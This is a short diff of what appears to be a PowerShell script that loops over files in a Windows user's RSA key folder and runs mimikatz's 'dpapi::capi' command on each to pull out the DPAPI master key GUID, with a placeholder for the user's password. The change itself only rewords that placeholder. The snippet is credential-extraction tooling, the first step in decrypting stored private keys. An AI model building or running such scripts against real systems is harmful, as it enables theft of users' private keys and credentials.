@@ -2,7 +2,7 @@
 
 Get-ChildItem ".\RSA\S-1-5-21-788893716-389553871-1612069284-1001\"  | 
 Foreach-Object {
-    $pass = "NEED TO TYPE IN USER_PASS"
+    $pass = "NEED TO WRITE HERE THE USER_PASSWORD"
 	#Write-Host $_.FullName
     $first_step = "mimikatz.exe `"dpapi::capi /in:" + $_.FullName + "`" `"exit`" |findstr guidMasterKey"
     
